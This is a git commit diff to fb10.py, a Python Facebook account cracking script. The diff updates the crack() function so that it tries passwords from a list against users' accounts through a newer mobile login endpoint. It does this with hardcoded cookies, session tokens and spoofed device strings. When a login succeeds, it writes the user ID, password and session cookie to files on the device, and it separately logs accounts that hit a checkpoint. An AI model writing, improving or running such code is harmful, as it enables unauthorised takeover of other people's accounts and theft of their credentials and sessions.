d5de88d818d64b84b60b9c850aca598d3941dd30
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2026-04-21 20:06:07 +0530

    Update fb10.py

--- fb10.py
+++ fb10.py
@@ -7,7 +7,7 @@ Author: BITHIKA
 Version: 2.0
 """
 
-import random
+import random,json
 import re
 import sys
 import time
@@ -142,7 +142,6 @@ def crack(uid, password_list, total_count):
             facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
             bv = f"{random.randint(1111111,7777777)}"
             versi_android = f"{random.randint(6,14)}"
-            domail = random.choice(["m", "mobile", "p", "x", "mbasic", "touch", "www", "web"])
             deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
             deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
@@ -150,34 +149,146 @@ def crack(uid, password_list, total_count):
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
             url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
             requu1 = Session.get(url1)
-            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+            cookies = {
+            'datr': 's3DnaVt0Ppo0TwRMpZ1kEEnJ',
+            'sb': 'tHDnaXYE7WAwGzRK48S-eDkp',
+            'm_pixel_ratio': '2.75',
+            'wd': '393x851',
+            'fr': '0uqh2fWw2NMYZzvq8..Bp53C0..AAA.0.0.Bp53Di.AWfaqs8q8Qk6dJAmvrOLjPzkzCs',}
+            params = {
+            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
+            'type': 'action',
+            'bkv': 'b7fb9726bc1fc393a9d9ca95c0a85c5fd9e24af496e45a3b86182631fcc46540',}
+            log_data = {
+    'aaid': '0',
+    'user': '0',
+    'a': '1',
+    'req': '9',
+    'hs': '20564.BP:wbloks_caa_pkg.2.0...0',
+    'dpr': '3',
+    'ccg': 'EXCELLENT',
+    'rev': '1037787856',
+    's': ':jhu5bd:yq3egn',
+    'hsi': '7631192013243032848',
+    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x67o1g8hw23E52q1ew2io0D24o1MUaE1Do1u81x82ewnE3fwww5NyE25w8W0Lo6-1CwOw5jw4JwzK0zo3jwGwbu',
+    'locale': 'bn_IN',
+    'fb_dtsg': 'NAftjixQQIlwR_SPbE7TxB7s7LAh7BDuPHYnowu6pyXp8L8bpUQDDew:0:0',
+    'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
+    'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+    'params': json.dumps({
+        "params": json.dumps({
+            "server_params": {
+                "next_uri": "https://m.facebook.com/v16.0/dialog/oauth?cct_prefetching=0&client_id=254616967963463&cbt=1776775346589&e2e=%7B%22init%22%3A1776775346590%7D&ies=0&sdk=android-18.2.3&nonce=9bf149a1-7435-4645-8ffc-08de6980a707&scope=openid%2Cpublic_profile&state=%7B%220_auth_logger_id%22%3A%22b5c968eb-7b68-4fc1-821a-27ea96f5a126%22%2C%223_method%22%3A%22web_view%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fsuccess&auth_type=rerequest&display=touch&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=JxrgIFavWCD1JzK4x7P04eHA8JVsnubV9MOghbSv5os&ret=login&fbapp_pres=0&logger_id=b5c968eb-7b68-4fc1-821a-27ea96f5a126&tp=unspecified",
+                "credential_type": "password",
+                "username_text_input_id": "m6127p:74",
+                "password_text_input_id": "m6127p:75",
+                "login_source": "Login",
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "ar_event_source": "login_home_page",
+                "should_trigger_override_login_success_action": 0,
+                "should_trigger_overide_login_2fa_action": 0,
+                "is_caa_perf_enabled": 0,
+                "reg_flow_source": "login_home_native_integration_point",
+                "caller": "gslr",
+                "is_from_landing_page": 0,
+                "is_from_empty_password": 0,
+                "is_from_aymh": 0,
+                "is_from_password_entry_page": 0,
+                "is_from_assistive_id": 0,
+                "is_from_msplit_fallback": 0,
+                "two_step_login_type": "one_step_login",
+                "left_nav_button_action": "NONE",
+                "INTERNALlatency_qpl_marker_id": 36707139,
+                "INTERNALlatency_qpl_instance_id": "134038309300204",
+                "device_id": None,
+                "family_device_id": None,
+                "waterfall_id": "04d1f076-a815-4fc5-b22b-25c2d8f0f573",
+                "offline_experiment_group": None,
+                "layered_homepage_experiment_group": None,
+                "is_platform_login": 0,
+                "is_from_logged_in_switcher": 0,
+                "is_from_logged_out": 0,
+                "access_flow_version": "pre_mt_behavior",
+                "login_surface": "login_home",
+                "login_entry_point": "logged_out"
+            },
+            "client_input_params": {
+                "machine_id": "",
+                "cloud_trust_token": None,
+                "block_store_machine_id": "",
+                "zero_balance_state": "",
+                "contact_point": uid,
+                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+                "accounts_list": [],
+                "fb_ig_device_id": [],
+                "secure_family_device_id": "",
+                "encrypted_msisdn": "",
+                "headers_infra_flow_id": "",
+                "try_num": 1,
+                "login_attempt_count": 1,
+                "event_flow": "login_manual",
+                "event_step": "home_page",
+                "openid_tokens": {},
+                "auth_secure_device_id": "",
+                "client_known_key_hash": "",
+                "has_whatsapp_installed": 0,
+                "sso_token_map_json_string": "",
+                "should_show_nested_nta_from_aymh": 0,
+                "gms_incoming_call_retriever_eligibility": "client_not_supported",
+                "password_contains_non_ascii": "false",
+                "has_granted_read_contacts_permissions": 0,
+                "has_granted_read_phone_permissions": 0,
+                "app_manager_id": "",
+                "aymh_accounts": [{
+                    "id": "",
+                    "profiles": {
+                        "id": {
+                            "user_id": "",
+                            "name": "",
+                            "profile_picture_url": "",
+                            "small_profile_picture_url": None,
+                            "notification_count": 0,
+                            "credential_type": "none",
+                            "token": "",
+                            "last_access_time": 0,
+                            "is_derived": 0,
+                            "username": "",
+                            "password": "",
+                            "has_smartlock": 0,
+                            "account_center_id": "",
+                            "account_source": "",
+                            "credentials": [],
+                            "nta_eligibility_reason": None,
+                            "from_accurate_privacy_result": 0,
+                            "dbln_validated": 0
+                        }
+                    }
+                }],
+                "sso_accounts_auth_data": [],
+                "network_bssid": None,
+                "lois_settings": {
+                    "lois_token": ""
+                },
+                "aac": ""
+            }
+        })
+    })
+}
             #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
-            url = f"https://{domail}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/async/wbloks/fetch/"
             headers = {
-            'user-agent': us,
-            'Accept-Encoding': 'gzip, deflate',
-            'accept': '*/*',
-            'Connection': 'keep-alive',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 12; M2010J19SI Build/SKQ1.211202.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36',
+            # 'Accept-Encoding': 'gzip, deflate',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
             'origin': 'https://m.facebook.com',
-            'priority': 'u=1, i',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=507811537136246&kid_directed_site=0&app_id=507811537136246&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D507811537136246%26cbt%3D1736483470728%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfadd3b7728fbfb6c3%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%26client_id%3D507811537136246%26display%3Dpopup%26domain%3Dwww.z2u.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.z2u.com%252Flogin.html%26locale%3Den_US%26logger_id%3Df4ae87efc07dfc1f4%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df98748ee374d96fe2%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%2526frame%253Df81b6c91ffd56da37%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df98748ee374d96fe2%26domain%3Dwww.z2u.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.z2u.com%252Ff3fcbc8cc23807a4b%2526relation%3Dopener%2526frame%3Df81b6c91ffd56da37%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duer_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not-A.Brand";v="24", "Chromium";v="128"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="24.0.0.0", "Chromium";v="128.0.6613.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '"5.15.123"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
+            'x-requested-with': 'com.kiloo.subwaysurf',
             'sec-fetch-site': 'same-origin',
-            'x-asbd-id': '129477',
-            'x-fb-lsd': us,
-            'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream'}   
-            respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=254616967963463&kid_directed_site=0&app_id=254616967963463&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D254616967963463%26cbt%3D1776775346589%26e2e%3D%257B%2522init%2522%253A1776775346590%257D%26ies%3D0%26sdk%3Dandroid-18.2.3%26nonce%3D9bf149a1-7435-4645-8ffc-08de6980a707%26scope%3Dopenid%252Cpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b5c968eb-7b68-4fc1-821a-27ea96f5a126%2522%252C%25223_method%2522%253A%2522web_view%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fsuccess%26auth_type%3Drerequest%26display%3Dtouch%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DJxrgIFavWCD1JzK4x7P04eHA8JVsnubV9MOghbSv5os%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db5c968eb-7b68-4fc1-821a-27ea96f5a126%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fsuccess%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b5c968eb-7b68-4fc1-821a-27ea96f5a126%2522%252C%25223_method%2522%253A%2522web_view%2522%257D&display=touch&locale=bn_IN&pl_dbl=0&is_business_login=0&refsrc=deprecated',
+            'accept-language': 'en-IN,en-US;q=0.9,en;q=0.8',}
+            respon = Session.post(url,params=params,data=log_data,cookies=cookies,headers=headers,allow_redirects=False) #proxies=proxs)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
@@ -188,14 +299,12 @@ def crack(uid, password_list, total_count):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     print('\033[1;92m OK '+user+'|'+pw+'')
-                    print('\033[1;92m url '+url+'')
                     print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                     open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                     oks.append(user)
                     continue
             elif 'checkpoint' in log_cookies:
                 print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
-                print('\033[1;92m url '+url+'')
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 continue
